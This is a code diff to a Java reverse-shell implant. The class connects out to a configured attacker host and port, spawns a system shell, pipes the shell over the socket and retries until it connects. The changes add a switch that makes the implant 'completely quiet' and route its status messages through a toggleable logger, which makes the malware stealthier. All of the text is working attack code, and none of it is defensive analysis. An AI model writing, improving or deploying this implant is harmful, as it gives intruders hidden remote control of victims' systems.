@@ -34,6 +34,12 @@ public class RevShellImplant implements Runnable, Thread.UncaughtExceptionHandle
      */
     static volatile int CONF_RETRY_WAIT_SECONDS = 30;
 
+    /**
+     * Print debug output to stdout.
+     * Setting this to false will make the implant completely quiet.
+     */
+    static volatile boolean CONF_DEBUG_OUTPUT = true;
+
     @SuppressWarnings("unused")
     public static void init() {
         if (System.getProperty(CONF_JVM_MARKER_PROP) == null) {
@@ -71,24 +77,25 @@ public class RevShellImplant implements Runnable, Thread.UncaughtExceptionHandle
 
         Optional<Path> shellCommand = findShellExecutable();
         if (shellCommand.isEmpty()) {
-            System.out.println("[!] Cannot find shell executable!");
+            log("[!] Cannot find shell executable!");
             return;
         }
 
         while (!Thread.interrupted()) {
-            System.out.println("[$] Connecting to " + CONF_LHOST + ":" + CONF_LPORT + "...");
+            log("[$] Connecting to " + CONF_LHOST + ":" + CONF_LPORT + "...");
             try (Socket connection = new Socket(CONF_LHOST, CONF_LPORT)) {
                 InputStream fromRemote = connection.getInputStream();
                 OutputStream toRemote = connection.getOutputStream();
-                System.out.println("[+] Connected to " + CONF_LHOST + ":" + CONF_LPORT + "!");
+                log("[+] Connected to " + CONF_LHOST + ":" + CONF_LPORT + "!");
 
+                String shellCommandExecStr = shellCommand.get().toAbsolutePath().toString();
                 Process shell = new ProcessBuilder()
-                        .command(shellCommand.get().toAbsolutePath().toString())
+                        .command(shellCommandExecStr)
                         .redirectErrorStream(true)
                         .start();
                 InputStream fromShell = shell.getInputStream();
                 OutputStream toShell = shell.getOutputStream();
-                System.out.println("[$] Shell popped with PID " + shell.pid() + ".");
+                log("[$] Shell '" + shellCommandExecStr + "' popped with PID " + shell.pid() + ".");
 
                 Thread pipe1 = new Thread(() -> {
                     transfer(fromShell, toRemote);
@@ -100,14 +107,14 @@ public class RevShellImplant implements Runnable, Thread.UncaughtExceptionHandle
                 });
                 pipe2.start();
 
-                System.out.println("[ ] Waiting...");
+                log("[ ] Waiting...");
                 pipe1.join();
                 pipe2.join();
 
                 shell.destroy();
-                System.out.println("[ ] Terminated.");
+                log("[ ] Terminated.");
             } catch (IOException e) {
-                System.out.println("[!] " + e.getClass().getName() + ": " + e.getMessage());
+                log("[!] " + e.getClass().getName() + ": " + e.getMessage());
                 try {
                     Thread.sleep(Duration.ofSeconds(CONF_RETRY_WAIT_SECONDS).toMillis());
                 } catch (InterruptedException ignored) {
@@ -137,8 +144,6 @@ public class RevShellImplant implements Runnable, Thread.UncaughtExceptionHandle
                 }
                 output.write(buffer, 0, readAmount);
                 output.flush();
-                System.out.print(".");
-                System.out.flush();
             } catch (IOException e) {
                 break;
             }
@@ -219,6 +224,12 @@ public class RevShellImplant implements Runnable, Thread.UncaughtExceptionHandle
             return cmd;
         } else {
             return Optional.empty();
+        }
+    }
+
+    private static void log(String msg) {
+        if (CONF_DEBUG_OUTPUT) {
+            System.out.println(msg);
         }
     }
 
